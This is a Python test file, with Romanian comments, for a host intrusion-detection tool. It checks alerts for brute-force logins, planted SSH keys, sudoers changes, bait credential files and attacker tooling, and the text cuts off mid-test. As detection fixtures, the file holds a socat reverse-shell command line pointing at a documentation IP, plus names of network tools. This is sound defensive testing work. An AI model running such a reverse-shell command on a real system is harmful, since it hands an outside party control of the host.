"""Detecția post-compromitere și profilul de comportament.

Testul care contează cel mai mult e ultimul: un scenariu complet de intruziune,
pas cu pas, care verifică nu că fiecare regulă funcționează izolat, ci că
lanțul produce alerte la momentele în care un operator ar avea nevoie de ele.
"""
from __future__ import annotations

import asyncio
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import pytest

from sentinel.constants import SEVERITIES
from sentinel.detect import intrusion, novelty
from sentinel.detect.rules import RULES
from sentinel.predict import behaviour as bh

NOW = datetime(2026, 8, 6, 3, 14, tzinfo=timezone.utc)


def run(c):
    return asyncio.run(c)


class _DB:
    """Întoarce rânduri programate pe potrivire de text în SQL."""

    def __init__(self, rows=None, vals=None):
        self.rows, self.vals = rows or {}, vals or {}
        self.sql: list[str] = []
        self.args: list[tuple] = []

    def _pick(self, table, sql, default=None):
        for k, v in table.items():
            if k in sql:
                return v
        return default

    async def fetch(self, sql, *a):
        self.sql.append(sql)
        # Argumentele, nu doar textul. Interogarea e o constantă în modul, deci
        # o aserțiune pe textul ei trece chiar dacă apelantul nu mai cere
        # îngustarea — exact felul de test care pare să acopere ceva.
        self.args.append(a)
        v = self._pick(self.rows, sql, [])
        return v(*a) if callable(v) else v

    async def fetchrow(self, sql, *a):
        self.sql.append(sql)
        v = self._pick(self.rows, sql)
        if isinstance(v, list):
            return v[0] if v else None
        return v

    async def fetchval(self, sql, *a):
        self.sql.append(sql)
        v = self._pick(self.vals, sql, 0)
        return v(*a) if callable(v) else v

    async def execute(self, sql, *a):
        self.sql.append(sql)


def _row(**kw):
    base = {"action": "ssh_key_change", "n": 1, "paths": None, "procs": None,
            "users": None, "event_ids": [1], "first_ts": NOW, "last_ts": NOW,
            "sample": {}, "arch": None, "syscall": None}
    base.update(kw)
    return base


# ABI-ul măsurat pe amândouă gazdele (15 septembrie 2026), scris aici ca
# literal: dacă cineva schimbă constanta din modul, testele de mai jos trebuie
# să rămână legate de ce scrie chiar auditd în jurnal, nu de ce crede modulul.
X86_64 = "c000003e"
OPENAT = "257"      # ausyscall x86_64 openat
GETXATTR = "191"    # ausyscall x86_64 getxattr
LGETXATTR = "192"   # ausyscall x86_64 lgetxattr


# --- regulile de post-compromitere ----------------------------------------
def test_a_single_ssh_key_write_is_critical():
    """Fără prag de volum. O cheie scrisă în authorized_keys e acces care
    supraviețuiește schimbării parolei — a doua nu adaugă nimic la ce trebuie
    să știi."""
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", n=1, paths=["/root/.ssh/authorized_keys"],
        procs=["/usr/bin/tee"], users=["1000"])]})
    specs = run(intrusion.persistence(db, 0))
    assert len(specs) == 1
    assert specs[0].severity == "critical"
    assert "authorized_keys" in specs[0].summary


def test_intrusion_rules_never_produce_a_blockable_address():
    """Fapta e pe gazdă. Adresa care a scris cheia poate fi 127.0.0.1 sau poate
    lipsi; a bloca ceva pe baza ei ar însemna, în cel mai rău caz, să te
    blochezi pe tine."""
    db = _DB(rows={"e.source = 'auditd'": [_row(action="sudoers_change")]})
    for spec in run(intrusion.privilege_escalation(db, 0)):
        assert spec.src_ip is None
        assert spec.actor_key == "host"


def _bf_row(**kw):
    """Rândul pe care `_BRUTEFORCE_SQL` l-ar întoarce: cont + adresă,
    numărate separat, ca funcția să aleagă dovada corectă."""
    base = {
        "ip": "203.0.113.47", "username": "root", "geo_country": "DE",
        "geo_asn": 200651, "metoda": "password", "ok_id": 99, "ok_ts": NOW,
        "fails_cont": 0, "fails_ip": 0,
        "first_fail_cont": None, "first_fail_ip": None,
        "fail_ids_cont": [], "fail_ids_ip": [],
    }
    base.update(kw)
    return base


def test_a_successful_login_after_a_burst_of_failures_is_critical():
    """Restul motorului alertează pe cele 200 de încercări eșuate. Asta
    alertează pe a 201-a — singura care contează. Sute de eșecuri pe `root`
    urmate de o reușită pe `root`, cu parola: ESTE incident."""
    db = _DB(rows={"WITH ok AS": [_bf_row(
        fails_cont=214, fails_ip=214,
        first_fail_cont=NOW - timedelta(minutes=7),
        fail_ids_cont=[1, 2, 3])]})
    specs = run(intrusion.successful_login_after_bruteforce(db, 0))
    assert len(specs) == 1
    s = specs[0]
    assert s.severity == "critical"
    assert "REUȘITĂ" in s.title
    assert "214" in s.summary
    assert s.evidence["fails_before"] == 214


def test_failures_on_other_accounts_do_not_taint_a_different_accounts_success():
    """Defectul reparat pe 30 august 2026, exact ca la `insights.posture`:
    trei refuzuri pe `acme-ops`, `deploy` și `admin`, apoi o reușită pe
    `sentinel-deploy` de pe ACEEAȘI adresă — alt cont, deci nimic spart. Nu e
    incident, fiindcă eșecurile de pe contul care a reușit sunt zero.

    `fails_ip=7` (peste `MIN_FAILS_BEFORE`) e ales anume: dacă regula ar mai
    citi eșecurile pe adresă în loc de cele pe cont, testul ăsta ar trece
    fals — un `fails_ip` sub prag n-ar fi deosebit cazul bun de cel reparat."""
    db = _DB(rows={"WITH ok AS": [_bf_row(
        username="sentinel-deploy",
        fails_cont=0,   # nimic pe `sentinel-deploy` însuși
        fails_ip=7)]})  # cele trei refuzuri există, dar pe alte conturi
    specs = run(intrusion.successful_login_after_bruteforce(db, 0))
    assert specs == [], "eșecuri pe alt cont nu fac reușita suspectă"


def test_a_publickey_success_is_never_flagged_no_matter_how_many_failures():
    """O cheie nu se ghicește. Reușită pe `publickey` după oricâte eșecuri pe
    parolă de la aceeași adresă/cont: nu e o forțare care a mers."""
    db = _DB(rows={"WITH ok AS": [_bf_row(
        metoda="publickey", fails_cont=500, fails_ip=500)]})
    specs = run(intrusion.successful_login_after_bruteforce(db, 0))
    assert specs == [], "publickey nu poate fi rezultatul unei ghiciri"


def test_a_reverse_shell_command_line_reaches_the_alert():
    """`socat` singur nu deosebește un reverse shell de un script de
    administrare. Argumentele o fac."""
    db = _DB(rows={"suspicious_exec": [{
        "id": 7, "ts": NOW, "process": "/usr/bin/socat", "username": "33",
        "raw": {"argv": "socat TCP:198.51.100.9:4444 EXEC:/bin/bash"}}]})
    specs = run(intrusion.attacker_tooling(db, 0))
    assert specs[0].severity == "critical"
    assert "4444" in specs[0].summary


def test_curl_is_high_not_critical():
    """Îl folosește toată lumea. Ridicat la critic ar face alerta despre socat
    să valoreze la fel de puțin."""
    db = _DB(rows={"suspicious_exec": [{
        "id": 8, "ts": NOW, "process": "/usr/bin/curl", "username": "33",
        "raw": {}}]})
    assert run(intrusion.attacker_tooling(db, 0))[0].severity == "high"


def test_webroot_tampering_asks_the_disambiguating_question():
    """Regula cu cel mai mare potențial de fals-pozitive din fișier. Textul
    trebuie să spună operatorului ce să verifice, nu doar ce s-a întâmplat."""
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="webroot_change", n=3, paths=["/var/www/html/x.php"])]})
    s = run(intrusion.webroot_tampering(db, 0))[0]
    assert s.severity == "high"
    assert "deploy" in s.summary.lower()


# --- profilul de comportament ---------------------------------------------
def _learning(dimension, *, days, obs, distinct, warm=None):
    """Vârsta se măsoară față de ceasul REAL, nu față de `NOW`.

    `_promote_warm` compară `started_at` cu `datetime.now()`, aşa cum trebuie —
    o dimensiune se încălzeşte în timp calendaristic. Construind `started_at`
    dintr-un `NOW` îngheţat, vârsta cazului „prea puţine zile" creştea cu o zi
    la fiecare zi care trecea de la scrierea testului. A trecut trei zile şi a
    început să pice, fără ca nimic din cod să se schimbe.

    Un test care depinde de ziua în care e rulat e mai rău decât niciunul: cade
    într-o zi în care nimeni nu a atins zona, iar prima reacţie e să fie crezut.
    """
    return {"started_at": datetime.now(timezone.utc) - timedelta(days=days),
            "observations": obs, "distinct_keys": distinct, "warm_at": warm}


def test_a_dimension_needs_both_days_and_observations():
    """ȘI, nu SAU. Numai zilele: un server oprit trei zile ar deveni cald fără
    să fi văzut nimic. Numai observațiile: o mie de autentificări într-o oră
    spun ce se întâmplă într-o oră, nu ce e normal marți dimineața."""
    dim = bh.BY_NAME["login_user"]
    cases = [
        (_learning("login_user", days=10, obs=5, distinct=3), False, "prea puține observații"),
        (_learning("login_user", days=0.5, obs=999, distinct=9), False, "prea puține zile"),
        (_learning("login_user", days=10, obs=999, distinct=1), False, "o singură cheie"),
        (_learning("login_user", days=10, obs=999, distinct=3), True, "ambele praguri"),
    ]
    for row, expect_warm, why in cases:
        db = _DB(rows={"FROM behaviour_learning": row})
        promoted = run(bh._promote_warm(db))
        assert (("login_user" in promoted) is expect_warm), why


def test_an_already_warm_dimension_is_not_re_promoted():
    """Persistat, nu recalculat: retenția taie observațiile vechi, iar o
    dimensiune caldă nu are voie să redevină rece — ar fi o a doua perioadă
    oarbă, exact când profilul e cel mai valoros."""
    db = _DB(rows={"FROM behaviour_learning":
                   _learning("login_user", days=99, obs=1, distinct=1, warm=NOW)})
    assert run(bh._promote_warm(db)) == []


def test_novelty_is_silent_while_the_dimension_is_learning():
    """Fără poarta asta, prima zi ar produce o alertă pentru fiecare utilizator,
    fiecare rețea și fiecare binar de pe server — adică sute, iar operatorul ar
    învăța din prima zi să ignore canalul."""
    db = _DB(vals={"warm_at IS NOT NULL": False},
             rows={"FROM behaviour_profiles": [
                 {"key": "atacator", "first_seen": NOW, "observations": 1}]})
    assert run(novelty.unseen_before(db, 0)) == []


def test_a_new_key_on_a_warm_dimension_alerts_once_per_key():
    db = _DB(vals={"warm_at IS NOT NULL": True, "count(*)": 4,
                   "EXTRACT(EPOCH": 21.0},
             rows={"FROM behaviour_profiles": [
                 {"key": "ro-backup", "first_seen": NOW, "observations": 1},
                 {"key": "svc-deploy", "first_seen": NOW, "observations": 1}]})
    specs = run(novelty.unseen_before(db, 0))
    prints = {s.fingerprint for s in specs}
    # Două valori noi = două incidente, nu unul actualizat.
    assert len(prints) == len(specs)
    assert any("ro-backup" in s.title for s in specs)


def test_acknowledged_keys_stop_alerting():
    """Marcarea e o decizie umană, vizibilă în tabelă. Un profil care ar învăța
    tăcut din propriile alerte ar putea fi antrenat de atacator."""
    sql_seen: list[str] = []

    class DB(_DB):
        async def fetch(self, sql, *a):
            sql_seen.append(sql)
            return []

    run(novelty._fresh_keys(DB(), "login_user"))
    assert any("acknowledged = false" in s for s in sql_seen)


# --- schimbarea bruscă de compoziție --------------------------------------
@pytest.mark.parametrize(
    "now_new,mean,buckets,expected,why",
    [
        (8, 0.1, 400, True,  "rafală față de o dimensiune liniștită"),
        (2, 0.1, 400, False, "sub minimul absolut, oricât de mare ar fi multiplul"),
        (8, 6.0, 400, False, "dimensiune care oricum descoperă chei noi des"),
        (8, 0.1, 5,   False, "prea puțin istoric ca media să însemne ceva"),
    ])
def test_composition_shift_thresholds(now_new, mean, buckets, expected, why):
    db = _DB(vals={"warm_at IS NOT NULL": True},
             rows={"WITH cur AS": {"now_new": now_new, "mean": mean,
                                   "buckets": buckets},
                   "FROM behaviour_profiles": []})
    specs = run(novelty.composition_shift(db, 0))
    assert bool(specs) is expected, why


# --- ordinea în motor -----------------------------------------------------
def test_learning_runs_before_the_rules_that_read_the_profile():
    """`observe()` scrie profilul; regulile citesc cheile pe care tocmai le-a
    creat. Inversat, o cheie ar fi ratată dacă serviciul cade între cei doi
    pași, sau re-alertată la nesfârșit dacă nu cade."""
    names = [r.__name__ for r in RULES]
    assert names.index("_learn") < names.index("unseen_before")
    assert names.index("_learn") < names.index("composition_shift")


def test_the_attempt_rules_still_run():
    """Post-compromiterea se ADAUGĂ, nu înlocuiește."""
    names = {r.__name__ for r in RULES}
    assert {"ssh_bruteforce", "web_enumeration", "suricata_alert",
            "volume_anomaly"} <= names


# --- scenariul complet ----------------------------------------------------
def test_a_full_intrusion_produces_alerts_at_each_stage():
    """Parola ghicită, cheie lăsată, privilegii luate, unealtă adusă.

    Testul nu verifică o regulă, ci că lanțul produce o alertă în fiecare
    moment în care operatorul ar avea nevoie de una. Înainte, singura alertă din
    toată secvența era pentru încercările EȘUATE de la început."""
    stages = []

    # 1. a intrat
    db = _DB(rows={"WITH ok AS": [_bf_row(
        username="deploy", geo_country="RU", geo_asn=12345,
        ok_id=1, fails_cont=180, fails_ip=180,
        first_fail_cont=NOW - timedelta(minutes=9), fail_ids_cont=[1])]})
    stages += run(intrusion.successful_login_after_bruteforce(db, 0))

    # 2. și-a lăsat cheia
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", paths=["/root/.ssh/authorized_keys"])]})
    stages += run(intrusion.persistence(db, 0))

    # 3. și-a luat root
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="sudoers_change", paths=["/etc/sudoers.d/x"])]})
    stages += run(intrusion.privilege_escalation(db, 0))

    # 4. și-a adus unealta
    db = _DB(rows={"suspicious_exec": [{
        "id": 4, "ts": NOW, "process": "/usr/bin/socat", "username": "0",
        "raw": {"argv": "socat TCP:198.51.100.9:4444 EXEC:/bin/bash"}}]})
    stages += run(intrusion.attacker_tooling(db, 0))

    assert len(stages) == 4, "fiecare etapă trebuie să producă o alertă"
    assert all(s.severity == "critical" for s in stages)
    # Amprente distincte: patru incidente separate, nu unul actualizat de patru
    # ori. Operatorul trebuie să vadă progresia, nu ultima stare.
    assert len({s.fingerprint for s in stages}) == 4


# --- ce am învățat din 851 de incidente reale ------------------------------
#
# Serverul a produs, în șapte zile, incidente `high` intitulate „Unealtă de
# atacator executată: install / chmod / logrotate / sefcontext_compile", plus
# un „chei SSH modificate" cu 62 de detecții. Niciunul nu era ce spunea că e.
# Testele de aici descriu cele patru cauze, în ordinea în care se compuneau.

@pytest.mark.parametrize("binar", ["install", "chmod", "logrotate",
                                   "sefcontext_compile", "sed", "python3"])
def test_ordinary_binaries_are_not_attacker_tools(binar):
    """Regula avea `TOOL_WEIGHT.get(name, "high")`.

    Orice binar necunoscut primea severitate ridicată și titlul „Unealtă de
    atacator executată". `install` și `chmod` sunt utilitare pe care le rulează
    orice instalare — inclusiv a noastră. O regulă al cărei mod de eșec e să
    strige „lupul" nu are voie să aibă o valoare implicită permisivă.
    """
    db = _DB(rows={"suspicious_exec": [{
        "id": 1, "ts": NOW, "process": f"/usr/bin/{binar}",
        "username": "1000", "raw": {}}]})
    assert run(intrusion.attacker_tooling(db, 0)) == []


def test_the_tools_it_does_know_still_fire():
    """Îngustarea nu are voie să stingă semnalul pentru care există regula."""
    db = _DB(rows={"suspicious_exec": [
        {"id": 1, "ts": NOW, "process": "/usr/bin/ncat", "username": "1000", "raw": {}},
        {"id": 2, "ts": NOW, "process": "/usr/bin/wget", "username": "1000", "raw": {}},
    ]})
    specs = run(intrusion.attacker_tooling(db, 0))
    assert {s.evidence["tool"] for s in specs} == {"ncat", "wget"}


def test_ssh_watch_is_narrowed_to_ssh_paths_in_sql():
    """`-w /home` prinde tot ce scrie oricine în directorul lui.

    Nucleul nu cunoaște globuri, deci nu are cum să urmărească doar
    /home/*/.ssh/. Îngustarea trebuie să existe în interogare — dacă ar fi
    făcută după grupare, numărul de evenimente ar rămâne umflat cu scrierile
    irelevante chiar dacă titlul ar arăta corect.
    """
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="ssh_key_change", n=1, paths=["/root/.ssh/authorized_keys"])]})
    run(intrusion.persistence(db, 0))

    assert "e.action <> $4::text" in db.sql[0]
    # Interogarea o suportă; aserțiunea care contează e că APELANTUL o cere.
    narrow_action, narrow_paths = db.args[0][3], db.args[0][4]
    assert narrow_action == "ssh_key_change"
    assert narrow_paths, "regula nu trimite tiparele de cale"
    # Și numai acțiunea aceea e îngustată: /etc/crontab și /etc/systemd/system
    # sunt deja exact ce ne interesează.
    assert all("ssh" in t or "authorized_keys" in t for t in narrow_paths)


def test_the_collector_and_the_sql_gate_share_one_definition_of_an_ssh_path():
    """Îngustarea se face acum în două locuri: la clasificare, în colector, și
    în interogare, pentru rândurile deja scrise sub eticheta veche. Cu două
    liste separate ar diverge la prima modificare, iar divergența s-ar vedea ca
    un fals-negativ tăcut — o cheie SSH scrisă și neraportată."""
    from sentinel.collectors.auditd import SSH_PATH_LIKE, looks_like_ssh_path

    assert intrusion.SSH_PATHS is SSH_PATH_LIKE
    # Și că predicatul din Python chiar înseamnă ce înseamnă tiparele LIKE.
    for path in ("/home/x/.ssh/authorized_keys", "/home/x/.ssh",
                 "/etc/ssh/sshd_config", "/root/.ssh/id_rsa"):
        assert looks_like_ssh_path(path), path
    for path in ("/home/deploy/=", "/home/deploy/rotateCount",
                 "/home/x/.bash_history", "/var/www/html/x.php"):
        assert not looks_like_ssh_path(path), path


# --- garda pe forma evidenței (incidentul 4268) ----------------------------
def _pathless_spec(**kw):
    from sentinel.detect.spec import DetectionSpec

    base = dict(
        rule_id="intrusion.persistence.ssh_key_change", rule_family="intrusion",
        severity="critical", src_ip=None, actor_key="host",
        fingerprint="intrusion.persistence.ssh_key_change:ssh_key_change",
        title="Mecanism de persistență modificat: chei SSH sau configurație",
        summary="6 modificări în 10 min", event_ids=[1], path_backed=True,
        # Evidența exactă a incidentului 4268.
        evidence={"auid": ["1000"], "count": 6, "paths": ["=", "rotateCount"],
                  "processes": ["/usr/bin/bash"], "window_min": 10})
    base.update(kw)
    return DetectionSpec(**base)


def test_a_detection_that_cannot_name_a_file_is_not_critical():
    """`=` și `rotateCount` nu sunt căi de fișier.

    Un critic fals repetat de zeci de ori face mai mult rău decât unul lipsă:
    operatorul încetează să citească toate celelalte. O regulă al cărei titlu
    spune „fișierul X s-a modificat" și care nu poate arăta niciun X nu susține
    ce afirmă.
    """
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec())
    assert s.severity != "critical"
    assert s.evidence["evidence_guard"] == "no_plausible_path"
    assert s.evidence["severity_claimed"] == "critical"


def test_a_degraded_detection_is_still_above_the_notification_floor():
    """Degradarea nu are voie să însemne tăcere.

    Botul e singurul consumator al alertelor și citește `unnotified()` cu pragul
    din `telegram.min_severity`. Coborâtă sub el, o detecție degradată nu ar
    ajunge niciodată la operator — iar `medium` e, pe gazda asta, o coadă cu 433
    de incidente deschise și 422 nenotificate. Un `chmod u+s` nimerit peste o
    graniță de citire produce un eveniment fără cale, deci ajunge exact aici.
    """
    from sentinel.config import TelegramConfig
    from sentinel.constants import SEVERITIES
    from sentinel.detect.spec import UNSUPPORTED_SEVERITY

    rank = SEVERITIES.index
    assert rank(UNSUPPORTED_SEVERITY) >= rank(TelegramConfig.min_severity), (
        "severitatea degradată e sub pragul de notificare livrat: garda ar fi "
        "suprimare, nu degradare")
    # Și cea mai de sus treaptă care nu e `critical`: mai jos ar fi o alegere
    # despre cât de tare vrem să nu deranjăm, nu despre ce știm.
    assert SEVERITIES[rank(UNSUPPORTED_SEVERITY) + 1] == "critical"


def test_the_degraded_detection_is_still_written_and_says_why():
    """Garda nu are voie să ascundă un colector stricat.

    O alertă care dispare în tăcere ar face invizibilă exact cauza care a
    produs zgomotul. Detecția rămâne, cu motivul în evidență și cu un titlu
    care spune ce se știe de fapt.
    """
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec())
    assert "fără cale" in s.title
    assert "auditd" in s.summary
    # Amprentă separată: altfel detecțiile degradate s-ar aduna în incidentul
    # critic real și i-ar umfla contorul — fix simptomul „62 de detecții".
    assert s.fingerprint != _pathless_spec().fingerprint


def test_one_real_path_is_enough_to_keep_the_severity():
    """Îngustarea nu are voie să stingă semnalul pentru care există regula. O
    scriere reală în authorized_keys rămâne critică chiar dacă lângă ea, în
    aceeași fereastră, a nimerit și un token fără sens."""
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec(
        evidence={"paths": ["=", "/root/.ssh/authorized_keys"]}))
    assert s.severity == "critical"
    assert "fără cale" not in s.title
    assert "evidence_guard" not in s.evidence


def test_the_guard_only_ever_lowers_a_severity_and_says_which_it_did():
    """Alerta spunea „severitate coborâtă" imediat după ce o urcase.

    Ce se strică dacă pică: `intrusion.bait_attribute_probe` e prima regulă
    `low` care susține un fișier. Fără nicio cale în evidență, garda o ducea la
    `high` — două trepte în SUS, peste pragul de notificare — și lipea deasupra
    propoziția „Severitate coborâtă din `low` până când există o cale". Un `ls`
    peste momeală, cu calea nerezolvată de colector, ajungea astfel la operator
    ca alertă mai tare decât a cerut regula, însoțită de un text care susține
    exact pe dos. O propoziție care se contrazice singură e chiar lucrul care
    face ca următoarele alerte să nu mai fie citite.
    """
    from sentinel.detect.spec import enforce_path_evidence

    rank = SEVERITIES.index
    assert SEVERITIES, "scara goală — bucla de mai jos n-ar verifica nimic"
    for ceruta in SEVERITIES:
        s = enforce_path_evidence(_pathless_spec(severity=ceruta))
        assert rank(s.severity) <= rank(ceruta), (
            f"garda a URCAT `{ceruta}` la `{s.severity}`")
        coborata = rank(s.severity) < rank(ceruta)
        assert ("coborâtă" in s.summary) == coborata, (
            f"textul spune altceva decât s-a întâmplat: `{ceruta}` -> "
            f"`{s.severity}`")
        assert s.evidence["severity_claimed"] == ceruta, ceruta

    # Și cazul real, nu doar unul construit de mână: regula pipăirii de
    # atribute, pe un rând căruia colectorul nu i-a putut da nicio cale.
    fara_cale = _bait_specs([None], proc="/usr/bin/ls", syscall=GETXATTR)[0]
    assert fara_cale.rule_id == "intrusion.bait_attribute_probe"
    assert fara_cale.path_backed and not fara_cale.evidence["paths"]
    assert enforce_path_evidence(fara_cale).severity == "low"


def test_a_rule_that_never_promised_a_path_is_left_alone():
    """`init_module` nu are înregistrare PATH și textul alertei nu promite una.
    O gardă pornită implicit ar retrograda tăcut încărcarea unui modul de
    kernel — sub care nu mai există nimic care să observe."""
    from sentinel.detect.spec import enforce_path_evidence

    s = enforce_path_evidence(_pathless_spec(path_backed=False, evidence={"paths": []}))
    assert s.severity == "critical"

    # Și că regula chiar se declară așa.
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="module_load", n=1, procs=["/usr/sbin/insmod"])]})
    assert run(intrusion.module_load(db, 0))[0].path_backed is False


def test_the_path_rules_declare_themselves_path_backed():
    """O regulă pe fișier care nu se declară așa ocolește garda în tăcere."""
    cases = {
        "ssh_key_change": intrusion.persistence,
        "sudoers_change": intrusion.privilege_escalation,
        "webroot_change": intrusion.webroot_tampering,
        "suid_change": intrusion.suid_change,
        "bait_touched": intrusion.bait_touched,
    }
    for action, rule in cases.items():
        db = _DB(rows={"e.source = 'auditd'": [_row(action=action, paths=["/etc/x"])]})
        specs = run(rule(db, 0))
        assert specs and specs[0].path_backed, action


def test_the_engine_applies_the_guard_before_writing_the_detection(monkeypatch):
    """Garda trăiește în motor, nu în fiecare regulă.

    Pusă în reguli, o regulă nouă ar putea să o uite, iar uitarea s-ar vedea
    abia ca un critic fals în telefonul operatorului.
    """
    from sentinel.db.repo import incidents as inc_repo
    from sentinel.detect import engine
    from sentinel.respond import decider

    seen: dict = {}

    async def _false(*a, **kw):
        return False

    async def _none(*a, **kw):
        return None

    async def _record(db, **kw):
        seen.update(kw)
        return 1

    async def _upsert_incident(db, **kw):
        seen["incident_severity"] = kw["severity"]
        return 7, True

    async def _consider(*a, **kw):
        return "observed"

    monkeypatch.setattr(inc_repo, "actor_is_allowlisted", _false)
    monkeypatch.setattr(inc_repo, "upsert_actor", _none)
    monkeypatch.setattr(inc_repo, "record_detection", _record)
    monkeypatch.setattr(inc_repo, "upsert_incident", _upsert_incident)
    monkeypatch.setattr(inc_repo, "link_detection", _none)
    monkeypatch.setattr(inc_repo, "add_timeline", _none)
    monkeypatch.setattr(decider, "consider", _consider)

    cfg = SimpleNamespace(detection=SimpleNamespace(enabled=True))
    run(engine._apply(_DB(), cfg, _pathless_spec()))
    from sentinel.detect.spec import UNSUPPORTED_SEVERITY

    assert seen["severity"] == UNSUPPORTED_SEVERITY != "critical"
    assert seen["incident_severity"] == UNSUPPORTED_SEVERITY


def test_setuid_gets_its_own_rule_naming_the_file():
    """Semnalul exista, dar împărțea cheia de audit cu uneltele de rețea.

    Ajungea în regula de tooling și era raportat ca „unealtă de atacator
    executată: chmod". Întrebarea care conta — CE fișier a devenit setuid — nu
    apărea nicăieri.
    """
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="suid_change", n=1, paths=["/tmp/.hidden/rootshell"],
        procs=["/usr/bin/chmod"], users=["1000"])]})
    s = run(intrusion.suid_change(db, 0))[0]
    assert s.severity == "critical"
    assert "/tmp/.hidden/rootshell" in s.summary
    assert "unealt" not in s.title.lower()


def test_bait_touched_is_critical_and_names_the_file():
    """O momeală citită e printre puținele lucruri care justifică trezirea
    operatorului noaptea — cerut explicit pentru funcționalitatea 05."""
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="bait_touched", n=1, paths=["/root/.pgpass"],
        procs=["/usr/bin/cat"], users=["1000"],
        arch=X86_64, syscall=OPENAT)]})
    s = run(intrusion.bait_touched(db, 0))[0]
    assert s.severity == "critical"
    assert "/root/.pgpass" in s.summary
    assert s.path_backed


def test_bait_touched_passes_the_quiet_window():
    """Fereastra de liniște ține totul, în afară de `critical` și de câteva
    tipuri numite. O momeală critică care ar fi ținută până dimineața ar rata
    exact fereastra în care contează — noaptea, când nimeni nu se uită."""
    from sentinel.telegram import quiet

    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="bait_touched", paths=["/root/.aws/credentials"],
        arch=X86_64, syscall=OPENAT)]})
    s = run(intrusion.bait_touched(db, 0))[0]
    assert quiet.passes_anyway(s.severity), (
        "o momeală citită nu are voie să aștepte până la 06:00")


# --- momeala nu mai afirmă ceva fals ---------------------------------------
#
# Incidentul #487: `critical`, „Nimic legitim de pe gazdă nu deschide vreodată
# acest fișier — cineva e deja înăuntru și caută credențiale", produs de un
# `sudo psql` de rutină. Testele de mai jos păzesc, în ordine: că afirmația
# falsă nu se întoarce, că explicația corectă e acolo, că cele două momeli nu
# primesc același text, că o cale necunoscută e spusă ca necunoscută, și — cel
# mai important — că nimic din reparație nu a făcut o recoltare mai tăcută.

# Fragmente din afirmația care a produs incidentul. Potrivite pe bucăți, nu pe
# propoziția întreagă: o reformulare care păstrează sensul („nimic de pe gazdă
# nu are motiv să-l deschidă") ar trece de o comparație exactă.
_AFIRMATII_FALSE = (
    "nu deschide vreodată",
    "cineva e deja înăuntru",
    "fără motiv legitim",
    "niciun motiv legitim",
)


def test_bait_summary_does_not_claim_the_host_has_no_legitimate_reader():
    """Alerta nu mai are voie să-i spună operatorului, ca pe un fapt, că e spart.

    Ce se strică dacă pică: operatorul rulează `sudo psql -h 127.0.0.1`, o
    comandă de administrare obișnuită, și primește un `critical` care trece de
    `/mute` prin construcție și care afirmă că cineva e deja înăuntru și caută
    credențiale. `psql` deschide `$HOME/.pgpass` la fiecare conexiune, fiindcă
    asta face libpq, iar `$HOME`-ul lui root e chiar momeala. S-a întâmplat pe
    14 septembrie 2026 (incidentul #487, două citiri în `raw_events`). O alertă
    care afirmă ceva fals nu costă un fals-pozitiv, le costă pe toate cele de
    după ea.
    """
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="bait_touched", n=1, paths=["/root/.pgpass"],
        procs=["/usr/lib/postgresql/16/bin/psql"], users=["1001"],
        arch=X86_64, syscall=OPENAT)]})
    s = run(intrusion.bait_touched(db, 0))[0]
    text = f"{s.title} {s.summary}".lower()
    for fragment in _AFIRMATII_FALSE:
        assert fragment not in text, (
            f"alerta afirmă din nou „{fragment}” — fals pentru /root/.pgpass, "
            f"vezi comentariul de deasupra lui intrusion.bait_touched")


def test_bait_summary_names_the_legitimate_reader_and_what_to_check():
    """Fără explicație, operatorul rămâne cu aceeași întrebare la 3 dimineața.

    Ce se strică dacă pică: alerta a încetat să mintă, dar nu spune nici ce
    citește legitim `/root/.pgpass` (libpq), nici cum se deosebește o conexiune
    de rutină de o recoltare. Operatorul are un `critical` fără nicio cale de
    a-l închide, ceea ce se termină la fel ca o alertă falsă — încetează să le
    mai citească.
    """
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="bait_touched", n=1, paths=["/root/.pgpass"],
        procs=["/usr/lib/postgresql/16/bin/psql"], users=["1001"],
        arch=X86_64, syscall=OPENAT)]})
    s = run(intrusion.bait_touched(db, 0))[0]
    assert "libpq" in s.summary, "nu numește cititorul legitim"
    assert "grep" in _bait_command(s.summary), \
        "nu spune ce să tasteze ca să vadă exe/auid/ses"
    assert "ausearch" not in s.summary, (
        "`ausearch -k` a fost măsurat pe gazdă: peste 25 s, omorât de timeout, "
        "în toate variantele. O comandă care pare că atârnă, într-o alertă "
        "critică, la 3 dimineața")
    assert "4294967295" in s.summary, \
        "nu spune care auid face citirea de neexplicat"
    # Faptele observate rămân în text: fără ele, explicația n-are pe ce cădea.
    assert "/root/.pgpass" in s.summary
    assert "/usr/lib/postgresql/16/bin/psql" in s.summary
    assert "1001" in s.summary


def _bait_specs(paths, proc="/usr/bin/cat", auid="1001", n=1,
                arch=X86_64, syscall=OPENAT, extra_rows=()):
    db = _DB(rows={"e.source = 'auditd'": [
        _row(action="bait_touched", n=n, paths=paths, procs=[proc],
             users=[auid], arch=arch, syscall=syscall),
        *extra_rows]})
    return run(intrusion.bait_touched(db, 0))


def _bait_summary(paths, proc="/usr/bin/cat", auid="1001", n=1,
                  arch=X86_64, syscall=OPENAT):
    specs = _bait_specs(paths, proc=proc, auid=auid, n=n,
                        arch=arch, syscall=syscall)
    assert len(specs) == 1, ("regula n-a produs exact o detecție; orice "
                             "aserțiune pe text de mai jos ar fi vacuă")
    return specs[0]


def _bait_command(summary: str) -> str:
    """Comanda pe care alerta chiar îi cere operatorului s-o tasteze.

    Scoasă din text ca să se poată verifica CE face, nu că textul conține niște
    litere. O aserțiune pe o bucată de șir ar trece și peste o comandă ruptă.
    """
    import re as _re

    m = _re.search(r"`([^`]*sentinel_bait[^`]*)`", summary)
    assert m, "alerta nu mai conține nicio comandă care caută sentinel_bait"
    return m.group(1)


def test_the_two_baits_get_different_explanations():
    """Un text comun ar înmuia AWS degeaba sau ar lăsa PostgreSQL să mintă.

